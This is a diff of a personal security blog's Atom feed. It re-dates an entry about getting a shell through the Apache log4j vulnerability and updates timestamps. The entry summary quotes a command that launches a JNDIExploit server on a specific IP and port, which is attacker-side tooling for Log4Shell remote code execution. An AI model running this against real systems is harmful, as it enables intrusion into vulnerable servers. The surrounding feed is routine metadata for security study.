@@ -6,7 +6,7 @@
   <link href="http://h3ppo.github.io/atom.xml" rel="self"/>
   
   <link href="http://h3ppo.github.io/"/>
-  <updated>2023-04-01T09:49:03.459Z</updated>
+  <updated>2023-05-17T06:36:28.412Z</updated>
   <id>http://h3ppo.github.io/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>apache log4j漏洞 getshell记录</title>
+    <link href="http://h3ppo.github.io/2023/05/17/javasec/apache-log4j-jndi/apache-log4j-jndi/"/>
+    <id>http://h3ppo.github.io/2023/05/17/javasec/apache-log4j-jndi/apache-log4j-jndi/</id>
+    <published>2023-05-17T05:54:15.000Z</published>
+    <updated>2023-05-17T06:36:28.412Z</updated>
+    
+    
+      
+      
+        
+        
+    <summary type="html">&lt;pre&gt;&lt;code&gt;java -jar JNDIExploit-1.3-SNAPSHOT.jar -i 1.15.155.126 -p 2333&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;![image-20230512223118426](apache log4j</summary>
+        
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>Sqlmap使用学习</title>
@@ -165,28 +187,6 @@
         
         
     <summary type="html">&lt;p&gt;接上文（&lt;a</summary>
-        
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>apache log4j漏洞 getshell记录</title>
-    <link href="http://h3ppo.github.io/2021/12/12/javasec/apache-log4j-jndi/apache-log4j-jndi/"/>
-    <id>http://h3ppo.github.io/2021/12/12/javasec/apache-log4j-jndi/apache-log4j-jndi/</id>
-    <published>2021-12-12T05:54:15.000Z</published>
-    <updated>2023-05-17T06:31:30.400Z</updated>
-    
-    
-      
-      
-        
-        
-    <summary type="html">&lt;pre&gt;&lt;code&gt;java -jar JNDIExploit-1.3-SNAPSHOT.jar -i 1.15.155.126 -p 2333&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;![image-20230512223118426](apache log4j</summary>
         
       
     
